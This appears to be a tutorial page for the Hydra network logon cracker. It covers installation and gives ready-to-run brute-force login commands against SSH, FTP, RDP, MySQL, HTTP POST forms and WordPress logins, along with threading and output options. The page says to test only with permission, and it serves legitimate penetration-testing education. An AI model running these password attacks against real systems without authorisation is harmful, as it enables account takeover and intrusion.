About Hydra

Hydra is a fast and flexible network logon cracker that supports numerous protocols for attack. It's often used for penetration testing and security research to test password security.

Key Features

  • Support for multiple protocols (SSH, FTP, HTTP(S), etc.)
  • Parallel connection testing
  • Flexible and modular architecture
  • Support for multiple authentication methods
  • IPv4 and IPv6 support
  • Multiple user/password list support

Installation

On Kali Linux

sudo apt update && sudo apt install hydra

From Source

git clone https://github.com/vanhauser-thc/thc-hydra.git cd thc-hydra ./configure make sudo make install

Verify Installation

hydra -h

Basic Usage Guide

Basic Syntax

hydra -l username -P passwordlist.txt target protocol

1. SSH Attack

Single user, password list:

hydra -l user -P passwords.txt ssh://192.168.1.1

2. FTP Attack

Username list, single password:

hydra -L users.txt -p password ftp://192.168.1.1

3. Web Form Attack

HTTP POST form:

hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

Advanced Usage

1. Multiple Threads

Use 16 parallel connections:

hydra -t 16 -l admin -P passwords.txt 192.168.1.1 ssh

2. Verbose Output

hydra -v -v -l admin -P passwords.txt 192.168.1.1 ssh

3. Output to File

hydra -l admin -P passwords.txt 192.168.1.1 ssh -o output.txt

4. Specific Port

hydra -l admin -P passwords.txt 192.168.1.1 -s 2222 ssh

Practical Examples

WordPress Login

hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"

RDP Attack

hydra -t 1 -V -f -l administrator -P passwords.txt rdp://192.168.1.1

MySQL Database

hydra -l root -P passwords.txt 192.168.1.1 mysql

Common Hydra Options

  • -l [login]: Single username
  • -L [file]: List of usernames
  • -p [pass]: Single password
  • -P [file]: List of passwords
  • -t [tasks]: Number of parallel connections
  • -s [port]: Specific port number
  • -o [file]: Output file
  • -v: Verbose mode
  • -V: Show login attempts
  • -f: Stop after first found login/password

Best Practices

  • Legal Compliance: Only test systems you have permission to test
  • Resource Management: Start with fewer threads and increase as needed
  • Timeout Settings: Adjust timeouts based on network conditions
  • Wordlist Selection: Use appropriate wordlists for the target
  • Documentation: Keep detailed logs of all testing activities

Troubleshooting

  • Connection Issues: Verify network connectivity and firewall rules
  • Performance Problems: Adjust number of threads (-t option)
  • False Positives: Verify success/failure messages in form attacks
  • Rate Limiting: Use -c option to slow down attempts
